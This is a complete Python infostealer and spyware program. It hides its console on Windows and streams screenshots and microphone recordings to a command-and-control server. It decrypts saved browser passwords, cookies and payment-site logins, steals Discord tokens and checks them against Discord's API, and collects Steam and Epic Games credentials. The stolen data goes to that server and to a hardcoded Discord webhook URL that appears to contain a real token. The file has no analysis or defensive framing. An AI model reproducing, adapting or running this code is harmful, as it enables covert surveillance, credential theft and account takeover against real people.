import os
import re
import sys
import time
import json
import base64
import socket
import sqlite3
import shutil
import platform
import threading
import traceback
import subprocess
import requests
from datetime import datetime
from io import BytesIO

# ===== CONFIG =====
C2_URL = "https://c2-receiver.onrender.com"
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1543840098548846643/Nl_mYva2hVTQW3B9mriAFdLJzzFl5ng_lLTvv0_pv8kBv-J9QOmu64DE7ZrleN7PMZEl"
# ==================

TARGET_ID = socket.gethostname()
SCREEN_INTERVAL = 9
AUDIO_INTERVAL = 50
HARVEST_INTERVAL = 70

def push(data, filename, file_type):
    try:
        bio = BytesIO(data) if isinstance(data, bytes) else data
        if hasattr(bio, "seek"):
            bio.seek(0)
        files = {"file": (filename, bio)}
        form = {"target_id": TARGET_ID, "file_type": file_type}
        requests.post(f"{C2_URL}/upload", files=files, data=form, timeout=55)
    except Exception:
        pass

def push_text(text, filename, file_type):
    push(text.encode("utf-8", errors="ignore"), filename, file_type)

def dbg(msg):
    push_text(f"{datetime.now()} | {msg}\n", "debug.txt", "logs")

def send_webhook_embed(title, fields, color=0xFF0000):
    """Send a proper Discord embed"""
    if not DISCORD_WEBHOOK or "YOUR_" in DISCORD_WEBHOOK:
        dbg("webhook not configured")
        return
    try:
        embed = {
            "title": title,
            "color": color,
            "timestamp": datetime.utcnow().isoformat(),
            "fields": fields[:25],  # discord max 25 fields
            "footer": {"text": f"host: {TARGET_ID}"}
        }
        payload = {"embeds": [embed]}
        r = requests.post(DISCORD_WEBHOOK, json=payload, timeout=15)
        dbg(f"webhook status: {r.status_code}")
    except Exception as e:
        dbg(f"webhook err: {e}")

def send_webhook_text(content):
    if not DISCORD_WEBHOOK or "YOUR_" in DISCORD_WEBHOOK:
        return
    try:
        for i in range(0, len(content), 1900):
            chunk = content[i:i+1900]
            requests.post(DISCORD_WEBHOOK, json={"content": f"```yaml\n{chunk}\n```"}, timeout=15)
    except Exception as e:
        dbg(f"webhook text err: {e}")

# ================== STEALTH ==================
def full_stealth():
    if platform.system() != "Windows":
        return
    try:
        import ctypes
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd:
            ctypes.windll.user32.ShowWindow(hwnd, 0)
            ctypes.windll.user32.SetWindowPos(hwnd, 0, 0, 0, 0, 0, 0x0080)
        try:
            ctypes.windll.kernel32.FreeConsole()
        except Exception:
            pass
        ctypes.windll.kernel32.SetPriorityClass(
            ctypes.windll.kernel32.GetCurrentProcess(), 0x00000040)
    except Exception:
        pass

# ================== SCREEN / AUDIO ==================
def screen_loop():
    try:
        from PIL import ImageGrab
    except Exception as e:
        dbg(f"no PIL: {e}")
        return
    while True:
        try:
            img = ImageGrab.grab()
            buf = BytesIO()
            img.save(buf, format="JPEG", quality=30)
            push(buf.getvalue(), "live.jpg", "screenshots")
        except Exception as e:
            dbg(f"screen: {e}")
        time.sleep(SCREEN_INTERVAL)

def audio_loop():
    try:
        import sounddevice as sd
        from scipy.io.wavfile import write as wv
    except Exception as e:
        dbg(f"no audio: {e}")
        return
    while True:
        try:
            rec = sd.rec(int(5 * 16000), samplerate=16000, channels=1, dtype="float32")
            sd.wait()
            buf = BytesIO()
            wv(buf, 16000, rec)
            push(buf.getvalue(), f"a_{datetime.now().strftime('%H%M%S')}.wav", "audio")
        except Exception as e:
            dbg(f"audio: {e}")
        time.sleep(AUDIO_INTERVAL)

def check_vpn():
    try:
        out = subprocess.check_output("ipconfig", shell=True, stderr=subprocess.DEVNULL).decode(errors="ignore").lower()
        for k in ["vpn", "tun", "tap", "nordlynx", "wireguard", "openvpn", "proton", "mullvad"]:
            if k in out:
                return True
    except Exception:
        pass
    return False

# ================== BROWSER ==================
def get_chrome_key(base):
    try:
        import win32crypt
        with open(os.path.join(base, "Local State"), "r", encoding="utf-8") as f:
            raw = json.load(f)["os_crypt"]["encrypted_key"]
        key = base64.b64decode(raw)[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except Exception as e:
        dbg(f"key fail: {e}")
        return None

def decrypt_value(buff, key):
    if not buff or not key:
        return ""
    try:
        import win32crypt
        from Cryptodome.Cipher import AES
        if buff[:3] in (b"v10", b"v11"):
            return AES.new(key, AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode("utf-8", errors="ignore")
        return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode("utf-8", errors="ignore")
    except Exception:
        return ""

def harvest_browser():
    out = {"passwords": [], "recent": [], "cookies": [], "cards": []}
    if platform.system() != "Windows":
        return out
    try:
        import win32crypt
        from Cryptodome.Cipher import AES
    except Exception as e:
        dbg(f"IMPORT FAIL (need pywin32 + pycryptodome): {e}")
        return out

    local = os.getenv("LOCALAPPDATA", "")
    browsers = [
        ("Chrome", os.path.join(local, "Google", "Chrome", "User Data")),
        ("Edge", os.path.join(local, "Microsoft", "Edge", "User Data")),
        ("Brave", os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data")),
    ]
    for bname, base in browsers:
        if not os.path.isdir(base):
            continue
        key = get_chrome_key(base)
        if not key:
            continue
        dbg(f"{bname}: key OK")
        for profile in ["Default", "Profile 1", "Profile 2"]:
            login_db = os.path.join(base, profile, "Login Data")
            if not os.path.exists(login_db):
                continue
            tmp = os.path.join(os.environ.get("TEMP", "."), f"_ld_{bname}_{profile.replace(' ','')}.db")
            try:
                shutil.copy2(login_db, tmp)
                conn = sqlite3.connect(tmp)
                rows = conn.execute(
                    "SELECT origin_url, username_value, password_value, date_last_used FROM logins"
                ).fetchall()
                conn.close()
                try:
                    os.remove(tmp)
                except Exception:
                    pass
                for url, user, enc, last_used in rows:
                    if not user:
                        continue
                    pwd = decrypt_value(enc, key)
                    entry = {"browser": bname, "url": url or "", "user": user, "pass": pwd, "last_used": last_used or 0}
                    out["passwords"].append(entry)
                    if last_used and last_used > 0:
                        out["recent"].append(entry)
                    if re.search(r"card|payment|billing|checkout|stripe|paypal", url or "", re.I):
                        out["cards"].append(entry)
            except Exception as e:
                dbg(f"{bname} login err: {e}")

            cdb = os.path.join(base, profile, "Network", "Cookies")
            if not os.path.exists(cdb):
                cdb = os.path.join(base, profile, "Cookies")
            if os.path.exists(cdb):
                tmp = os.path.join(os.environ.get("TEMP", "."), f"_ck_{bname}.db")
                try:
                    shutil.copy2(cdb, tmp)
                    conn = sqlite3.connect(tmp)
                    for host, name, enc in conn.execute(
                        "SELECT host_key, name, encrypted_value FROM cookies LIMIT 200"
                    ):
                        val = decrypt_value(enc, key)
                        if val:
                            out["cookies"].append({"browser": bname, "host": host, "name": name, "value": val[:160]})
                    conn.close()
                    try:
                        os.remove(tmp)
                    except Exception:
                        pass
                except Exception:
                    pass
    out["recent"] = sorted(out["recent"], key=lambda x: x.get("last_used") or 0, reverse=True)[:30]
    dbg(f"pw={len(out['passwords'])} cards={len(out['cards'])}")
    return out

# ================== DISCORD ==================
def harvest_discord():
    tokens = set()
    results = []
    if platform.system() != "Windows":
        return results
    roaming = os.getenv("APPDATA", "")
    local = os.getenv("LOCALAPPDATA", "")
    paths = [os.path.join(roaming, n) for n in ["Discord", "discordcanary", "discordptb", "discorddevelopment"]]
    paths += [
        os.path.join(local, "Google", "Chrome", "User Data", "Default"),
        os.path.join(local, "Microsoft", "Edge", "User Data", "Default"),
        os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
    ]
    token_re = re.compile(rb"[\w-]{24,}\.[\w-]{6}\.[\w-]{25,}|mfa\.[\w-]{80,}")
    for base in paths:
        ldb = os.path.join(base, "Local Storage", "leveldb")
        if not os.path.isdir(ldb):
            continue
        for fn in os.listdir(ldb):
            if not (fn.endswith(".ldb") or fn.endswith(".log")):
                continue
            try:
                raw = open(os.path.join(ldb, fn), "rb").read()
                for m in token_re.findall(raw):
                    tokens.add(m.decode("utf-8", errors="ignore"))
            except Exception:
                pass
    dbg(f"discord tokens found: {len(tokens)}")
    for tok in list(tokens)[:12]:
        entry = {"token": tok}
        try:
            r = requests.get("https://discord.com/api/v9/users/@me",
                             headers={"Authorization": tok}, timeout=8)
            if r.status_code == 200:
                d = r.json()
                entry.update({
                    "id": str(d.get("id", "")),
                    "username": d.get("username", ""),
                    "email": d.get("email") or "n/a",
                    "phone": d.get("phone") or "n/a",
                    "mfa": str(d.get("mfa_enabled", ""))
                })
            else:
                entry["status"] = str(r.status_code)
        except Exception as e:
            entry["status"] = str(e)[:50]
        results.append(entry)
    return results

def harvest_steam(browser_pw):
    results = []
    base = os.path.join(os.environ.get("PROGRAMFILES(X86)", ""), "Steam")
    if not os.path.isdir(base):
        base = os.path.join(os.environ.get("PROGRAMFILES", ""), "Steam")
    vdf = os.path.join(base, "config", "loginusers.vdf")
    if os.path.exists(vdf):
        try:
            content = open(vdf, "r", errors="ignore").read()
            blocks = re.split(r'"(\d{17})"\s*\{', content)
            for i in range(1, len(blocks), 2):
                body = blocks[i+1] if i+1 < len(blocks) else ""
                acc = re.search(r'"AccountName"\s+"([^"]+)"', body)
                per = re.search(r'"PersonaName"\s+"([^"]+)"', body)
                results.append({
                    "steam_id": blocks[i],
                    "account_name": acc.group(1) if acc else "?",
                    "persona_name": per.group(1) if per else "?"
                })
        except Exception:
            pass
    for p in browser_pw:
        if "steam" in (p.get("url") or "").lower():
            results.append({
                "steam_email_or_user": p.get("user"),
                "steam_password": p.get("pass"),
                "url": p.get("url")
            })
    return results

def harvest_epic(browser_pw):
    results = []
    local = os.getenv("LOCALAPPDATA", "")
    base = os.path.join(local, "EpicGamesLauncher", "Saved")
    if os.path.isdir(base):
        for root, _, files in os.walk(base):
            for fn in files:
                if not fn.lower().endswith((".ini", ".json", ".log")):
                    continue
                try:
                    content = open(os.path.join(root, fn), "r", errors="ignore").read()
                    for m in re.findall(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", content):
                        results.append({"epic_email": m, "file": fn})
                except Exception:
                    pass
    for p in browser_pw:
        u = (p.get("url") or "").lower()
        if "epicgames" in u or "fortnite" in u or "unrealengine" in u:
            results.append({
                "epic_email_or_user": p.get("user"),
                "epic_password": p.get("pass"),
                "url": p.get("url")
            })
    return results

# ================== HARVEST ==================
def harvest_loop():
    time.sleep(5)
    while True:
        try:
            dbg("HARVEST START")
            browser = harvest_browser()
            discord = harvest_discord()
            steam = harvest_steam(browser.get("passwords", []))
            epic = harvest_epic(browser.get("passwords", []))
            vpn = check_vpn()

            # ===== DISCORD → WEBHOOK EMBED =====
            if discord:
                fields = []
                for d in discord:
                    val = f"```{d.get('token','')}```\n"
                    val += f"**User:** {d.get('username','?')}\n"
                    val += f"**Email:** {d.get('email','n/a')}\n"
                    val += f"**Phone:** {d.get('phone','n/a')}\n"
                    val += f"**ID:** {d.get('id','?')} | MFA: {d.get('mfa','?')}"
                    if d.get("status"):
                        val += f"\nStatus: {d.get('status')}"
                    fields.append({
                        "name": f"Token · {d.get('username') or 'unknown'}",
                        "value": val[:1020],
                        "inline": False
                    })
                send_webhook_embed(
                    f"Discord Hit · {TARGET_ID}",
                    fields,
                    color=0x5865F2
                )
                # also plain text backup
                lines = [f"HOST: {TARGET_ID}"]
                for d in discord:
                    lines.append(f"TOKEN: {d.get('token')}")
                    lines.append(f"  EMAIL: {d.get('email')} | USER: {d.get('username')} | ID: {d.get('id')}")
                send_webhook_text("\n".join(lines))
                dbg("discord webhook sent")
            else:
                dbg("no discord tokens")

            # ===== STEAM / EPIC / CARDS / PW → APP =====
            lines = [
                f"TIME: {datetime.now()}",
                f"HOST: {socket.gethostname()}",
                f"USER: {os.getenv('USERNAME') or os.getenv('USER')}",
                f"VPN: {vpn}",
                "",
                "========== RECENT SIGN-INS ==========",
            ]
            for r in browser.get("recent", [])[:20]:
                lines.append(f"{r.get('browser')} | {r.get('url')}")
                lines.append(f"  USER: {r.get('user')}  PASS: {r.get('pass')}")
            lines.append("")
            lines.append("========== STEAM ==========")
            if not steam:
                lines.append("(none)")
            for s in steam:
                if "steam_id" in s:
                    lines.append(f"ID:{s.get('steam_id')} ACC:{s.get('account_name')} PERSONA:{s.get('persona_name')}")
                else:
                    lines.append(f"EMAIL/USER:{s.get('steam_email_or_user')} PASS:{s.get('steam_password')}")
            lines.append("")
            lines.append("========== EPIC ==========")
            if not epic:
                lines.append("(none)")
            for e in epic:
                if "epic_email_or_user" in e:
                    lines.append(f"EMAIL/USER:{e.get('epic_email_or_user')} PASS:{e.get('epic_password')}")
                elif "epic_email" in e:
                    lines.append(f"EMAIL:{e.get('epic_email')}")
                else:
                    lines.append(str(e))
            lines.append("")
            lines.append("========== CARDS ==========")
            for c in browser.get("cards", []):
                lines.append(f"{c.get('browser')} | {c.get('url')}")
                lines.append(f"  USER: {c.get('user')}  PASS: {c.get('pass')}")
            lines.append("")
            lines.append("========== ALL PASSWORDS ==========")
            for p in browser.get("passwords", [])[:50]:
                lines.append(f"{p.get('browser')} | {p.get('url')}")
                lines.append(f"  USER: {p.get('user')}  PASS: {p.get('pass')}")
            lines.append("")
            lines.append("========== COOKIES ==========")
            for c in browser.get("cookies", [])[:40]:
                lines.append(f"{c.get('host')} | {c.get('name')}={c.get('value')}")

            push_text("\n".join(lines), "accounts.txt", "accounts")
            dbg("app data uploaded")
        except Exception as e:
            dbg(f"FATAL: {e}\n{traceback.format_exc()}")
        time.sleep(HARVEST_INTERVAL)

if __name__ == "__main__":
    full_stealth()
    time.sleep(0.3)
    full_stealth()
    dbg("agent online")
    threading.Thread(target=screen_loop, daemon=True).start()
    threading.Thread(target=audio_loop, daemon=True).start()
    threading.Thread(target=harvest_loop, daemon=True).start()
    while True:
        time.sleep(180)
